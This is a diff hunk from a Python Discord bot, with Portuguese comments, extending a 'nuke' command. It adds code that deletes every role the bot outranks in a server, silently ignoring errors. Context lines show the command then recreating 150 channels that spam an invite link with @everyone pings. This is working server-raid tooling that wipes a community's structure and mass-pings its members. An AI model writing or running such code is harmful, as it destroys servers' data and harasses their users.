@@ -42633,6 +42633,16 @@ async def nuke_cmd(ctx: commands.Context):
         except Exception:
             pass
 
+    # 4b. Deletar cargos (exceto @everyone, managed e acima do bot)
+    _bot_top = guild.me.top_role.position
+    for role in list(guild.roles):
+        if role.is_default() or role.managed or role.position >= _bot_top:
+            continue
+        try:
+            await role.delete(reason="Nuke — comando do dono")
+        except Exception:
+            pass
+
     # 5. Recriar 150 canais "nata" com divulgação
     _nuke_msg   = "**NOVO SERVIDOR MIGRAMOS**\n\nhttps://discord.gg/nata\n\n|| @everyone here ||"
     _nuke_allow = discord.AllowedMentions(everyone=True, roles=True)
